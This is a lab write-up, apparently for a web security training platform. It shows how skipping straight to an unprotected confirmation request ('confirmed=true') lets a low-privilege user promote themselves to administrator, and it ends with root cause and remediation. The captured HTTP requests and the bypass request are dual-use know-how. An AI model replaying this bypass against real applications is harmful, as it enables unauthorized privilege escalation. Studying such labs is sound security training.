# Multi-Step Process with No Access Control on One Step

## Description

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

## Solution

### Step 1: Confirm wiener cannot directly perform the role change

I logged in as `wiener` and retried the approach used in the previous method-based access control lab, sending both `POST` and `GET` requests to `/admin-roles` with `username=wiener&action=upgrade`. Neither succeeded this time, indicating this lab's access control was implemented differently.

### Step 2: Inspect the role change flow as administrator

I logged in as `administrator` and visited `/admin`. Performing a role change through the UI revealed that the process happens in two separate steps.

The first request initiates the change:

```http
POST /admin-roles HTTP/2
Host: 0a520024030f924f80fe3580004200b7.web-security-academy.net
Cookie: session=DVDd1dOTs9HxXme4qUzKlvBV93mF1CQI
Cache-Control: max-age=0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a520024030f924f80fe3580004200b7.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=wiener&action=upgrade
```

This is followed by a second, confirmation request:

```http
POST /admin-roles HTTP/2
Host: 0a520024030f924f80fe3580004200b7.web-security-academy.net
Cookie: session=DVDd1dOTs9HxXme4qUzKlvBV93mF1CQI
Cache-Control: max-age=0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a520024030f924f80fe3580004200b7.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

username=wiener&action=upgrade&confirmed=true
```

### Step 3: Identify the missing check

Testing each step individually as `wiener` showed that the first request (without `confirmed=true`) was properly protected and rejected for a non-admin user. However, the second request, which simply adds `confirmed=true` to the same parameters, performed the role change with no authorization check at all. The application appears to enforce access control only on the first step of the flow, and assumes that reaching the second step implies the first step's checks already passed, without re-verifying anything.

### Step 4: Exploit the unprotected step

While logged in as `wiener`, I sent the second-step request directly, skipping the first step entirely:

```
POST /admin-roles HTTP/2
Content-Type: application/x-www-form-urlencoded

username=wiener&action=upgrade&confirmed=true
```

This succeeded and upgraded `wiener` to administrator, solving the lab.

## Root Cause

The role change functionality is implemented as a two-step process: an initial request and a confirmation request carrying `confirmed=true`. Access control is only enforced on the first step. The second step trusts that if `confirmed=true` is present, the first step must have already been completed and authorized, and performs the privileged action without independently checking the requester's permissions. Since both steps are reachable directly and independently, an attacker can skip straight to the unprotected confirmation step.

## Remediation

- Enforce access control checks on every step of a multi-step process, not just the first. Each request that can independently trigger a sensitive action must be authorized on its own.
- Do not use the mere presence of a parameter, such as `confirmed=true`, as a substitute for verifying that the current user is actually authorized to perform the action.
- Where possible, track process state server-side (for example, tying a confirmation step to a server-generated, single-use token created during step one) rather than relying on client-supplied flags to indicate that prior steps were completed.